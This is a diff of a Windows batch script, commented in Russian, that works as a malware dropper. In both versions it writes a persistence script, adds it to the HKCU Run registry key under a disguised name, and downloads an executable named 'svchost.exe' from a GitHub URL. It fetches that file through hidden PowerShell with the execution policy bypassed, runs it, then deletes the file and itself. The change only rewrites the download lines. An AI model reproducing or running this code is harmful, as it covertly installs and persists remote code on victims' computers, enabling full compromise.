@@ -16,15 +16,24 @@ if not exist "%PERSIST_DIR%" mkdir "%PERSIST_DIR%" >nul 2>&1
 set "PERSIST_PATH=%PERSIST_DIR%\UsageLogs.bat"
 (
 echo @echo off
-echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$url='https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe';$path='%%TEMP%%\svchost.exe';try{Invoke-WebRequest -Uri $url -OutFile $path;Start-Process -FilePath $path}catch{}"
+echo cd /d "%%TEMP%%"
+echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe' -OutFile 'svchost.exe'"
+echo if exist "svchost.exe" start "" "svchost.exe"
 ) > "%PERSIST_PATH%"
 
-REM Добавляем в автозагрузку через реестр (скрытно)
+REM Добавляем в автозагрузку через реестр
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CLRUsageLog" /t REG_SZ /d "\"%PERSIST_PATH%\"" /f >nul 2>&1
 
-REM Скачиваем и запускаем .exe через PowerShell
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$url='https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe';$path='%TEMP%\svchost.exe';Invoke-WebRequest -Uri $url -OutFile $path;Start-Process -FilePath $path;Start-Sleep -Seconds 2;Remove-Item -Path $path -Force"
+REM Скачиваем и запускаем .exe
+cd /d "%TEMP%"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe' -OutFile 'svchost.exe'"
+if exist "svchost.exe" (
+    start "" "svchost.exe"
+    timeout /t 3 /nobreak >nul
+    del "svchost.exe" 2>nul
+)
 
 REM Удаляем себя
+cd /d "%~dp0"
 timeout /t 1 /nobreak >nul
 del "%~f0"
